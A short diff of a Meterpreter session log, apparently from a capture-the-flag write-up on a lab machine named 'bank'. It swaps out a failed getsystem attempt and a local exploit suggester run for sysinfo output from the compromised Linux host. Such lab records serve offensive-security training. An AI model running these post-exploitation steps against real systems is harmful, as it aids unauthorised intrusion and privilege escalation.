@@ -1,6 +1,4 @@
-meterpreter > getsystem
-[-] Unknown command: getsystem.
-meterpreter > run post/multi/recon/local_exploit_suggester
-
-[*] 10.129.29.200 - Collecting local exploits for php/linux...
-[-] 10.129.29.200 - No suggestions available.
+meterpreter > sysinfo
+Computer    : bank
+OS          : Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686
+Meterpreter : php/linux
